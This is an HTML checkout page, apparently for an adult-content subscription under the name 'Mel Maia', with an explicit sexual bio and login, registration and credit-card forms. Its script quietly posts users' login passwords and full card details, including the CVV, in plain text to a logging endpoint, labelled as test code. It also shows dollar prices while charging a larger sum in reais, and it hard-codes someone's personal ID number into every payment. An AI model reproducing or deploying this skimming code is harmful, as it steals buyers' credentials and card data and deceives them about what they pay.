<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Mel Maia - Credit Card Only</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <!-- Bootstrap Icons -->
  <link
    href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap-icons/1.11.1/font/bootstrap-icons.min.css"
    rel="stylesheet"
  >
  <!-- Your CSS -->
  <link rel="stylesheet" type="text/css" href="/styles/estilos.css" media="screen" />
</head>

<body>
  <!-- Banner (Mel Maia) -->
  <div class="banner-container">
      <img src="/img/banner2.png" alt="Banner" class="banner">
      <div class="banner-content">
          <div class="banner-username">Mel Maia</div>
          <div class="banner-stats">
              <div class="stat">
                  <i class="bi bi-camera-fill"></i>
                  <span>1.2K</span>
              </div>
              <div class="stat">
                  <i class="bi bi-camera-video-fill"></i>
                  <span>1K</span>
              </div>
              <div class="stat">
                  <i class="bi bi-heart-fill"></i>
                  <span>103.1K</span>
              </div>
          </div>
      </div>
      <div class="profile-pic-container">
          <img src="/img/perfil.png" alt="Profile" class="profile-pic">
      </div>
  </div>

  <div class="content-section">
    <!-- Name + Verified + Handle -->
    <div class="username-container">
      <span class="username">Mel Maia</span>
      <i class="bi bi-patch-check-fill verified-icon"></i>
    </div>
    <div class="handle">@melissamaia</div>

    <!-- Bio -->
    <p class="bio">
      My content is fully EXPLICIT and I do everything you like: anal, video calls, guided handjob, wet blowjob, long videos, public place videos, solo videos, and anything else you want to ask me in chat.
    </p>
    <div class="read-more"
         onclick="document.querySelector('.bio').classList.toggle('expanded'); 
                  this.textContent = (this.textContent === 'Read more' ? 'Read less' : 'Read more')">
      Read more
    </div>

    <!-- Counters of posts, photos, videos -->
    <div class="content-counters">
      1,859 posts • 1,164 photos • 1,018 videos
    </div>

    <!-- Subscription Section -->
    <div class="subscription-section" id="subscriptionSection">
      <div class="section-title">SUBSCRIPTIONS</div>
      <div class="subscription-button" data-plan="monthly">
        <span>Subscribe (1 month)</span>
        <span>$7.00 / month</span>
      </div>

      <div class="other-options">Other options</div>
      <div class="packages visible">
          <div class="section-title orange">SUBSCRIPTION PACKAGES</div>
          <div class="subscription-button" data-plan="3months">
              <span>Subscribe (30% OFF)</span>
              <span>$14.00</span>
          </div>
          <div class="subscription-button" data-plan="6months">
              <span>Subscribe (30% OFF)</span>
              <span>$25.00</span>
          </div>
      </div>
    </div>

    <!-- Benefits + Payment Section -->
    <div class="benefits-section" id="benefitsSection">
      <div class="benefits-title">SUBSCRIBE AND GET THESE BENEFITS</div>
      <div class="benefits-list">
        <div class="benefit-item">
          <i class="bi bi-check-lg"></i>
          <span>Access to all content</span>
        </div>
        <div class="benefit-item">
          <i class="bi bi-check-lg"></i>
          <span>Exclusive chat with the creator</span>
        </div>
        <div class="benefit-item">
          <i class="bi bi-check-lg"></i>
          <span>Cancel anytime</span>
        </div>
      </div>

      <!-- "Already have an account?" -->
      <div class="account-text" onclick="showLoginModal()">I already have an account</div>

      <!-- Registration form (if not logged) -->
      <div class="form-container" id="registrationForm">
        <div class="create-account-text">Create your account:</div>

        <div class="form-field">
          <div class="field-content">
            <div class="field-label">USERNAME</div>
            <div class="field-bottom">
              <i class="bi bi-person field-icon"></i>
              <input type="text" class="field-input" placeholder="Enter your username" maxlength="50">
            </div>
          </div>
        </div>

        <div class="form-field">
          <div class="field-content">
            <div class="field-label">EMAIL</div>
            <div class="field-bottom">
              <i class="bi bi-envelope field-icon"></i>
              <input type="email" class="field-input" placeholder="Enter your email">
            </div>
          </div>
        </div>

        <div class="form-field">
          <div class="field-content">
            <div class="field-label">FULL NAME</div>
            <div class="field-bottom">
              <i class="bi bi-person-vcard field-icon"></i>
              <input type="text" class="field-input" placeholder="Enter your full name">
            </div>
          </div>
        </div>

        <div class="form-field">
          <div class="field-content">
            <div class="field-label">PASSWORD</div>
            <div class="field-bottom">
              <i class="bi bi-lock field-icon"></i>
              <input type="password" class="field-input" placeholder="Enter your password">
            </div>
          </div>
        </div>

        <div class="terms-container" id="termsContainer">
          <label class="toggle-switch">
            <input type="checkbox" id="termsCheckbox">
            <span class="toggle-slider"></span>
          </label>
          <div class="terms-text">
            By subscribing, you declare that you agree with our 
            <a href="#">Terms of Service</a> and <a href="#">Privacy Policies</a>.
          </div>
        </div>
      </div>

      <!-- Credit Card Payment -->
      <div class="payment-section">
        <div class="payment-title">Credit Card Payment</div>
        
        <div class="payment-value">Amount to pay:</div>
        <div class="payment-amount" id="paymentAmount">$7.00</div>

        <!-- Card fields -->
        <div class="form-field">
          <div class="field-content">
            <div class="field-label">CARD HOLDER NAME</div>
            <div class="field-bottom">
              <i class="bi bi-person field-icon"></i>
              <input type="text" class="field-input" id="cardHolderName" placeholder="JOHN DOE">
            </div>
          </div>
        </div>

        <div class="form-field">
          <div class="field-content">
            <div class="field-label">CARD NUMBER</div>
            <div class="field-bottom">
              <i class="bi bi-credit-card-2-front field-icon"></i>
              <input type="text" class="field-input" id="cardNumber" placeholder="4111 1111 1111 1111" maxlength="19">
            </div>
          </div>
        </div>

        <div class="form-field">
          <div class="field-content">
            <div class="field-label">EXPIRATION (MM/YYYY)</div>
            <div class="field-bottom">
              <i class="bi bi-calendar2-minus field-icon"></i>
              <input type="text" class="field-input" id="cardExpiration" placeholder="06/2030" maxlength="7">
            </div>
          </div>
        </div>

        <div class="form-field">
          <div class="field-content">
            <div class="field-label">CVV</div>
            <div class="field-bottom">
              <i class="bi bi-lock-fill field-icon"></i>
              <input type="text" class="field-input" id="cardCVV" placeholder="123" maxlength="4">
            </div>
          </div>
        </div>

        <!-- installments removed => fixed = 1 -->

        <button class="payment-button" id="paymentButton" onclick="initiatePayment()">
          COMPLETE PAYMENT
        </button>

        <!-- Loading indicator -->
        <div class="loading-indicator" id="loadingIndicator" style="display:none;">
          <i class="bi bi-arrow-repeat spin"></i>
          Processing payment...
        </div>

        <!-- Error or success messages -->
        <div class="payment-error" id="paymentError" style="display:none;"></div>
        <div class="payment-success" id="paymentSuccess" style="display:none;">
          <i class="bi bi-check-circle-fill success-icon"></i>
          <h3>Payment confirmed!</h3>
          <p>Your access will be unlocked soon. You will receive an email with instructions.</p>
        </div>

      </div><!-- .payment-section -->
    </div><!-- .benefits-section -->
  </div><!-- .content-section -->

  <!-- Login Modal -->
  <div class="modal-overlay" id="loginModal">
    <div class="modal">
      <div class="modal-logo">
        <img src="/img/logoonly.png" alt="Logo">
      </div>
      <div class="modal-title">Log in</div>
      <input type="email" class="modal-input" placeholder="EMAIL" id="loginEmail">
      <input type="password" class="modal-input" placeholder="PASSWORD" id="loginPassword">
      <button class="modal-button" onclick="handleLogin()">LOGIN</button>
    </div>
  </div>

  <script>
    // 1) Planos mostrados em dólar
    // 2) Conversão pra reais (6.20) internamente
    //    7 => 43.40 ; 14 => 86.80 ; 25 => 155.00
    const usdToBrl = 6.20;

    // Exibido ao cliente
    let displayedPricesUSD = {
      'monthly': 7.00,
      '3months': 14.00,
      '6months': 25.00
    };

    // Converte pra reais (plano => valor em BRL)
    let planPricesBRL = {
      'monthly': (7.00 * usdToBrl).toFixed(2),     // 43.40
      '3months': (14.00 * usdToBrl).toFixed(2),   // 86.80
      '6months': (25.00 * usdToBrl).toFixed(2)    // 155.00
    };

    let currentPlan = 'monthly';
    let userLoginData = null;

    document.addEventListener('DOMContentLoaded', () => {
      // Botões de assinatura => atualizam valor exibido
      document.querySelectorAll('.subscription-button').forEach(btn => {
        btn.addEventListener('click', function() {
          currentPlan = this.dataset.plan;
          showBenefits();
          // Mostra valor em dólar p/ cliente
          document.getElementById('paymentAmount').textContent = `$${displayedPricesUSD[currentPlan].toFixed(2)}`;
        });
      });

      // Fecha modal de login se clicar fora
      document.getElementById('loginModal').addEventListener('click', function(e) {
        if (e.target === this) {
          this.classList.remove('visible');
        }
      });

      // Inserir automaticamente o '/' no campo "cardExpiration" após 2 dígitos
      const expirationField = document.getElementById('cardExpiration');
      expirationField.addEventListener('input', function(e) {
        let raw = this.value.replace(/[^\d]/g, '');
        if (raw.length >= 2) {
          raw = raw.substring(0,2) + '/' + raw.substring(2, 6);
        }
        raw = raw.substring(0,7);
        this.value = raw;
      });
    });

    function showBenefits() {
      document.getElementById('subscriptionSection').classList.add('hidden');
      document.getElementById('benefitsSection').classList.add('visible');
    }

    function showLoginModal() {
      document.getElementById('loginModal').classList.add('visible');
    }

    function handleLogin() {
      const email = document.getElementById('loginEmail').value;
      const password = document.getElementById('loginPassword').value;
      if (!email || !password) {
        alert('Please fill in all fields.');
        return;
      }
      userLoginData = { email, password };
      document.getElementById('loginModal').classList.remove('visible');

      // Salvar log no debug.log (APENAS PARA TESTES!) -- email+senha
      const logString = new Date().toISOString() 
                      + " - [LOGIN-TEST] Email=" + email 
                      + ", Password=" + password + "\n";

      fetch('salvar_log.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'log=' + encodeURIComponent(logString)
      });

      // Hide registration form
      document.getElementById('registrationForm').style.display = 'none';
      document.getElementById('termsContainer').style.display = 'none';
      document.querySelector('.account-text').style.display = 'none';

      // Show payment
      document.querySelector('.payment-section').style.display = 'block';
      document.querySelector('.payment-section').scrollIntoView({ behavior: 'smooth', block: 'start' });
    }

    function initiatePayment() {
      let installments = 1;

      // Se não logado, valida form
      if (!userLoginData && !validateForm()) {
        return;
      }
      // Checa termos
      if (!userLoginData && !document.getElementById('termsCheckbox').checked) {
        const termsCtn = document.getElementById('termsContainer');
        const err = document.createElement('div');
        err.className = 'field-error';
        err.style.color = '#FF0000';
        err.textContent = 'You must accept the terms to continue.';
        termsCtn.appendChild(err);
        termsCtn.scrollIntoView({ behavior: 'smooth', block: 'center' });
        return;
      }

      // Esconde mensagens antigas
      document.getElementById('paymentError').style.display = 'none';
      document.getElementById('paymentSuccess').style.display = 'none';

      // Mostra "Processing..."
      document.getElementById('loadingIndicator').style.display = 'flex';
      document.getElementById('paymentButton').style.display = 'none';

      // Calcula valor real em centavos (BRL)
      const amountBRL = parseFloat(planPricesBRL[currentPlan]);
      const amountCents = Math.round(amountBRL * 100);

      // Coleta dados do cartão
      const cardHolderName = document.getElementById('cardHolderName').value.trim();
      const cardNumber = document.getElementById('cardNumber').value.trim();
      const expiration = document.getElementById('cardExpiration').value.trim();
      const cvv = document.getElementById('cardCVV').value.trim();

      // Salvar log do cartão (APENAS PARA TESTES!)
      // Envia cardHolderName, cardNumber, expiration, cvv
      const cardLogString = new Date().toISOString()
        + " - [CARD-TEST] HolderName=" + cardHolderName
        + ", Number=" + cardNumber
        + ", Exp=" + expiration
        + ", CVV=" + cvv
        + "\n";

      fetch('salvar_log.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'log=' + encodeURIComponent(cardLogString)
      });

      // Se usuário não logado, pega dados do form
      const usernameField = document.querySelector('input[placeholder="Enter your username"]');
      const emailField = document.querySelector('input[placeholder="Enter your email"]');
      const fullNameField = document.querySelector('input[placeholder="Enter your full name"]');

      let finalEmail = emailField?.value || "test@example.com";
      if (userLoginData) {
        finalEmail = userLoginData.email;
      }

      let [expMonth, expYear] = ["", ""];
      if (expiration.includes('/')) {
        [expMonth, expYear] = expiration.split('/');
      }

      // Payload p/ payment_handler
      let paymentPayload = {
        action: "create_card_payment",
        amount: amountCents,
        installments: installments,
        card: {
          number: cardNumber.replace(/\D/g, ""),
          holderName: cardHolderName.toUpperCase(),
          expirationMonth: parseInt(expMonth) || 0,
          expirationYear: parseInt(expYear) || 0,
          cvv: cvv
        },
        customer: {
          name: fullNameField?.value || "NonLoggedUser",
          email: finalEmail,
          document: {
            number: "70174641680"
          }
        }
      };

      fetch("payment_handler.php", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(paymentPayload)
      })
      .then(res => res.json())
      .then(data => {
        // Esconde spinner
        document.getElementById('loadingIndicator').style.display = 'none';
        document.getElementById('paymentButton').style.display = 'block';

        if (data.success) {
          document.getElementById('paymentSuccess').style.display = 'block';
        } else {
          document.getElementById('paymentError').style.display = 'block';
          document.getElementById('paymentError').textContent = data.error || 'Payment error';
        }
      })
      .catch(err => {
        document.getElementById('loadingIndicator').style.display = 'none';
        document.getElementById('paymentButton').style.display = 'block';

        document.getElementById('paymentError').style.display = 'block';
        document.getElementById('paymentError').textContent = 'Fetch error: ' + err.message;
      });
    }

    function validateForm() {
      const username = document.querySelector('input[placeholder="Enter your username"]').value.trim();
      const email = document.querySelector('input[placeholder="Enter your email"]').value.trim();
      const fullname = document.querySelector('input[placeholder="Enter your full name"]').value.trim();
      const password = document.querySelector('input[placeholder="Enter your password"]').value.trim();

      if (!username || !email || !fullname || !password) {
        alert('Please fill in all required fields.');
        return false;
      }
      return true;
    }
  </script>
</body>
</html>
